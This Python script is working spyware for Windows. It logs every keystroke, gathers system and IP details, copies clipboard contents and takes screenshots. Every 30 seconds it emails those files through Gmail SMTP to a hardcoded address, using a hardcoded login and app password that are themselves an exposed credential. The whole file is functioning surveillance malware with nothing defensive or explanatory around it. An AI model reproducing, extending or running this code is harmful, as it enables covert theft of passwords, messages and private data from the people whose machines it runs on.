from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform


from requests import get
from pynput.keyboard import Key, Listener

import time




import os


from PIL import ImageGrab
import win32clipboard

keys_information = "keylog.txt"
system_information ="systeminfo.txt"
clipboard_information = "clipboard.txt"

screenshot_information = "screenshot.png"
email_address = "test17448@gmail.com"
password = "enaalbibwwodcymq"


username = os.path.expanduser('~')

time_iteration =30
number_of_iterations_end =500



toaddr="test17448@gmail.com"
file_path = username
extend = "\\"
file_merge =file_path+extend

def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()



def computer_information():
    with open(file_path + extend +system_information,"a") as f:
        hostname = socket.gethostname()
        IPAddr =socket.gethostbyname(hostname)

        try:

            public_ip =get("https://api.ipify.org").text
            f.write("Public IP Adress :"+ public_ip)

        except Exception:
            f.write("Couldnt get public Ip Adress most likely max query")


        f.write("\nProcessor: " +(platform.processor()) + '\n')

        f.write("System: "+ platform.system() + " " + platform.version() + '\n')

        f.write("Machine: " +platform.machine() + '\n')

        f.write("Hostname :" + hostname + '\n')

        f.write("Private Ip Adress: " +IPAddr + "\n")

computer_information()

send_email(system_information, file_merge + system_information, toaddr)


def copy_clipboard():
    with open(file_merge + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")








def screenshot():
    im =ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration


while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:


        send_email(keys_information, file_merge + keys_information, toaddr)
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        send_email(clipboard_information,file_merge + clipboard_information, toaddr)


        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
        with open(file_path + extend + clipboard_information, "w") as c:
            c.write(" ")


        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


